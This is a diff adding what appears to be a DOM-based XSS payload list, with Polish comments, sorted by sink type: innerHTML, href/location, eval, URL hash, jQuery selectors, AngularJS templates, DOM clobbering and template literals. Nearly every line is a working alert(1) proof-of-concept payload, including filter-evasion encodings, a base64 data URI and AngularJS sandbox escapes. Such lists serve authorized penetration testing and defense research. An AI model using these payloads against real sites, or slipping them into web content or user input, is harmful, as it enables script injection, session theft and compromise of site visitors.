@@ -1,0 +1,55 @@
+# === innerHTML / document.write sinks ===
+# Dla URL-a wstrzykiwanego do innerHTML/document.write
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+# === location / href sinks ===
+# Gdy parametr trafia do location, href, src
+javascript:alert(1)
+# Z encodingiem (omija proste 'javascript:' filtry)
+java%0ascript:alert(1)
+javascript&colon;alert(1)
+# Data URI — czasem akceptowane przez href
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# === eval / setTimeout / Function sinks ===
+# String trafia do eval() — domykamy i wstrzykujemy
+');alert(1)//
+");alert(1)//
+\';alert(1)//
+
+# === document.location.hash / search ===
+# Hash payload (nie idzie do serwera, tylko DOM)
+#<img src=x onerror=alert(1)>
+#"><svg onload=alert(1)>
+#javascript:alert(1)
+
+# === jQuery $() sink (CVE-2020-11022 i podobne) ===
+# Jeśli $(userInput) — selector treated as HTML
+<img src=x onerror=alert(1)>
+
+# === postMessage origin = * ===
+# Patrz client-side/postmessage.txt
+
+# === AngularJS sandbox bypass (1.x) ===
+# Dla aplikacji z legacy AngularJS w {{ }}
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+
+# === DOM clobbering markers ===
+<form id=x><input id=attributes>
+<a id=x name=y href=//evil>
+
+# === Script gadget triggers ===
+# Dla aplikacji używających analytics/jQuery z gadgetami
+<form><button formaction=javascript:alert(1)>x
+<a href=javascript:alert(1)>x</a>
+
+# === setTimeout('string') sink ===
+\";alert(1);//
+';alert(1);//
+
+# === Template literal context (ES6) ===
+${alert(1)}
+`}+alert(1)+`
